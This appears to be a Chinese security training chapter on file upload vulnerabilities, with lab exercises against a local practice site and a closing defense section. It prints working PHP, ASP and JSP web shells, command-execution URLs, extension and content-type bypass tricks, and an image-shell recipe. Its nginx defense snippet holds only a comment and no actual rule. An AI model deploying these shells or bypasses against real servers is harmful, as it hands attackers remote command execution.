# 6. 文件上传漏洞

## 是什么？

当应用允许用户上传文件，但没有正确校验文件类型和内容时，攻击者可以上传恶意脚本，在服务器上执行任意代码。

## 🧠 原理

```
攻击流程：
1. 找到一个允许上传的页面
2. 上传一个 Web Shell（如 shell.php, shell.jsp）
3. 访问上传的文件 URL
4. 服务器执行恶意代码 = 服务器被控！
```

## 🎯 靶场练习 6：文件上传

打开 `http://127.0.0.1:5000/upload`

### 练习 1：上传文本文件

先上传一个普通文件试试，确认上传路径。

### 练习 2：上传 Web Shell

创建文件 `shell.php`：

```php
<?php system($_GET['cmd']); ?>
```

上传后访问：
```
http://127.0.0.1:5000/uploads/shell.php?cmd=dir
http://127.0.0.1:5000/uploads/shell.php?cmd=whoami
```

### 如果靶场是 PHP 环境，经典的 PHP 一句话木马：

```php
<?php system($_GET['cmd']); ?>
<!-- 访问：/uploads/shell.php?cmd=whoami -->
```

### 更多语言

```asp
<% eval request("cmd") %>     ' ASP
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>  ' JSP
```

## 🧪 绕过上传限制

### 绕过黑名单扩展名

```
目标限制：.php 被禁止

绕过：
shell.php3
shell.php4
shell.php5
shell.phtml
shell.pHp       ← 大小写
shell.php.      ← 末尾加点
shell.php .     ← 末尾加空格
shell.php::$DATA  （Windows NTFS 特性）
shell.php%00.jpg （%00 截断，老版本 PHP）
shell.asp;.jpg  （IIS 解析漏洞）
```

### 绕过内容类型检查

```http
Content-Type: image/jpeg     ← 改成看起来合法的
实际文件内容：<?php system($_GET['cmd']); ?>
```

### 图片马

```bash
# 把一句话木马藏在图片末尾
copy /b original.jpg + shell.php evil.jpg
```

如果服务器有文件包含漏洞，图片马也能执行：
```
http://example.com/include.php?file=uploads/evil.jpg
```

## 🛡️ 防御方法

### ✅ 1. 白名单扩展名
```php
$ALLOWED = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $ALLOWED)) {
    throw new Exception("不允许的文件类型");
}
```

### ✅ 2. 检查文件内容（魔数）
```php
// 检查文件头（magic bytes）
$magic = file_get_contents($file['tmp_name'], false, null, 0, 4);
if (substr($magic, 0, 2) !== "\xFF\xD8") {  // JPEG 文件头
    throw new Exception("伪装成图片！");
}
```

### ✅ 3. 重命名文件
```php
$new_name = bin2hex(random_bytes(16)) . '.jpg';  // 自定义扩展名
```

### ✅ 4. 上传目录不执行脚本
```nginx
# Nginx 配置
location /uploads/ {
    # 禁止执行 PHP
}
```

### ✅ 5. 限制文件大小
```php
if ($file['size'] > 10 * 1024 * 1024) {  // 10MB
    throw new Exception("文件太大");
}
```

---

## 📝 练习

1. 在靶场上传 `shell.php`，访问看能否执行
2. 尝试上传 `.html` 文件并访问（这也算一种 XSS！）
3. 思考：如果服务器限制只允许 `.jpg`，你怎么绕过？

---

**下一步**：[路径遍历](07-path-traversal.md)
